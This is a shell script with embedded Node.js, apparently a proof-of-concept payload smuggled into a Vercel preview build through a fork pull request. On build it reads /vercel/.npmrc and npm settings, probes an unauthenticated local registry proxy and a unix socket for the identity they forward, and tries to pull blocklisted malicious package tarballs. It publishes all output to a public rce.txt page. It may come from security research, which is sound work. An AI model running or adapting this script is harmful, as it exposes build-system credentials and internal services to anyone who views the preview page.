#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 5: the cell's registry proxy
# (127.0.0.1:8402) answers unauthenticated. Two decisive questions:
#   (1) whose npm identity does it forward?  (2) does the malware blocklist
#       actually stop a tarball, or only the metadata/install path?
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== npm config in the cell =="
  cat /vercel/.npmrc 2>&1
  env | grep -E '^npm_config_(registry|cache_dir)=' | head -4
  echo -n "npm registry resolves to: "
  npm config get registry 2>&1 | head -1
} > "$F" 2>&1
{
  echo "== registry proxy: identity + blocklist enforcement =="
  node -e '
const http=require("http"),net=require("net"),crypto=require("crypto");
const req=(host,port,path,label,method)=>new Promise(res=>{
  const r=http.request({host,port,path,method:method||"GET",timeout:6000},x=>{
    let b="",cut=false,total=0;
    x.on("data",c=>{total+=c.length;if(b.length<120000)b+=c;else cut=true;});
    x.on("end",()=>{
      const h=crypto.createHash("sha256").update(b).digest("hex").slice(0,8);
      const hdr=Object.keys(x.headers).slice(0,12).join(",");
      res("  "+label+" -> "+x.statusCode+" | "+(cut?total+"b (first 120k hashed) ":total+"b ")+"sha "+h+" | hdrs: "+hdr+" | "+b.slice(0,140).replace(/\r?\n/g," "));
    });
    x.on("close",()=>{if(!b.length)res("  "+label+" -> connection closed with no body");});
  });
  r.on("error",e=>res("  "+label+" -> ERR "+e.code));
  r.end();
});
(async()=>{
  const P="127.0.0.1",Q=8402;
  const tests=[
    [P,Q,"/-/whoami","whoami (identity the proxy authenticates as)"],
    [P,Q,"/axios/-/axios-1.14.1.tgz","BLOCKED tarball axios@1.14.1"],
    [P,Q,"/plain-crypto-js/-/plain-crypto-js-4.2.0.tgz","BLOCKED tarball plain-crypto-js@4.2.0"],
    [P,Q,"/turbo/-/turbo-2.11.11.tgz","control tarball turbo@2.11.11"],
    [P,Q,"/litellm/-/litellm-1.107.0.tgz","pypi-named pkg via npm proxy"],
    [P,Q,"/-/package/axios/dist-tags","registry dist-tags api"],
  ];
  for(const t of tests) console.log(await req(t[0],t[1],t[2],t[3]));
  console.log("== same paths over the apm unix socket ==");
  const sock=(path,label)=>new Promise(res=>{
    const c=net.createConnection({path:"/run/apm/apm.sock",timeout:2500});
    let got="",done=false;
    const fin=()=>{if(done)return;done=true;
      const h=crypto.createHash("sha256").update(got).digest("hex").slice(0,8);
      console.log("  "+label+" -> "+got.split("\r\n")[0]+" | "+got.length+"b sha "+h+" | "+got.slice(0,160).replace(/\r?\n/g," "));
      res();};
    c.on("data",d=>got+=d);c.on("error",e=>{if(!done){done=true;console.log("  "+label+" -> ERR "+e.code);res();}});
    c.on("close",fin);
    c.on("connect",()=>c.write("GET "+path+" HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"));
  });
  for(const [p,l] of [["/turbo","apm.sock GET /turbo"],["/-/whoami","apm.sock GET /-/whoami"],["/v1/artifacts","apm.sock GET /v1/artifacts"],["/npm/turbo","apm.sock GET /npm/turbo"]]) await sock(p,l);
})();
' >> "$F" 2>&1
} >> "$F" 2>&1
sleep 3
cat "$F"
